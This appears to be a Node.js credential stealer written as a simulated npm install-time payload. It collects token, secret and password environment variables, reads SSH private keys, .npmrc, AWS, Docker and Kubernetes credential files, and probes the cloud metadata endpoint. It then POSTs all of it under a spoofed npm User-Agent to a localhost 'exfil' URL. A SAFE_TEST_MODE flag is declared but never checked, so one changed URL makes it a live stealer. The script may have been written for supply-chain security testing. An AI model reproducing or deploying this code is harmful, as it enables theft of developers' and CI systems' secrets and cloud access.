const http = require("http");
const https = require("https");
const os = require("os");
const fs = require("fs");
const path = require("path");

const SAFE_TEST_MODE = true;
const EXFIL_URL = "http://localhost:9999/exfil";
const IMDS_URL = "http://169.254.169.254/latest/meta-data/";

const SENSITIVE_KEYS = [
  "NPM_TOKEN",
  "npm_config_registry",
  "npm_config__auth",
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "GITLAB_TOKEN",
  "AZURE_CLIENT_SECRET",
  "DOCKER_AUTH_CONFIG",
  "CI",
  "JENKINS_URL",
  "TRAVIS",
  "CIRCLE_TOKEN",
  "HOSTNAME",
  "USER",
  "HOME",
];

function harvestEnv() {
  const harvested = {};
  for (const key of SENSITIVE_KEYS) {
    if (process.env[key]) {
      harvested[key] = process.env[key];
    }
  }

  for (const [key, value] of Object.entries(process.env)) {
    if (/token|secret|key|password|auth|credential/i.test(key)) {
      harvested[key] = value;
    }
  }
  return harvested;
}

function readCredentialFiles() {
  const home = os.homedir();
  const targets = [
    path.join(home, ".npmrc"),
    path.join(home, ".yarnrc"),
    path.join(home, ".ssh", "id_rsa"),
    path.join(home, ".ssh", "id_ed25519"),
    path.join(home, ".aws", "credentials"),
    path.join(home, ".aws", "config"),
    path.join(home, ".gitconfig"),
    path.join(home, ".docker", "config.json"),
    path.join(home, ".kube", "config"),
  ];

  const files = {};
  for (const filePath of targets) {
    try {
      const content = fs.readFileSync(filePath, "utf-8");
      files[filePath] = content;
    } catch (e) {

    }
  }
  return files;
}

function probeIMDS(callback) {
  http
    .get(IMDS_URL, { timeout: 2000 }, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => callback(data));
    })
    .on("error", () => callback(null));
}

function exfiltrate(payload) {
  const data = JSON.stringify(payload);
  const url = new URL(EXFIL_URL);

  const options = {
    hostname: url.hostname,
    port: url.port,
    path: url.pathname,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data),
      "User-Agent": "npm/8.0.0 node/v18.0.0",
    },
  };

  const req = http.request(options, () => {});
  req.on("error", () => {

  });
  req.write(data);
  req.end();
}

const stolen = {
  timestamp: new Date().toISOString(),
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: process.platform,
  arch: os.arch(),
  cwd: process.cwd(),
  env: harvestEnv(),
  files: readCredentialFiles(),
  imds: null,
};

probeIMDS((imdsData) => {
  stolen.imds = imdsData;
  exfiltrate(stolen);
});
